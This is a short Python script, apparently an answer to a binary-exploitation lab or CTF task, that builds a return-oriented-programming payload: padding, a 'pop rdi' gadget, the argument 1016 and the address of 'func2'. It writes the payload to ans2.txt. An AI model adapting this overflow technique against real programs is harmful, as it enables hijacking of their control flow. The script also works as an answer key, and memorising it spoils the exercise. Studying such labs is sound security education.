import struct

def p64(addr):
    return struct.pack("<Q", addr)

padding = b"A" * 16

pop_rdi = 0x4012c7

arg1 = 1016

func2_addr = 0x401216

payload = padding + p64(pop_rdi) + p64(arg1) + p64(func2_addr)

with open("ans2.txt", "wb") as f:
    f.write(payload)

print("Payload 成功生成至 ans2.txt")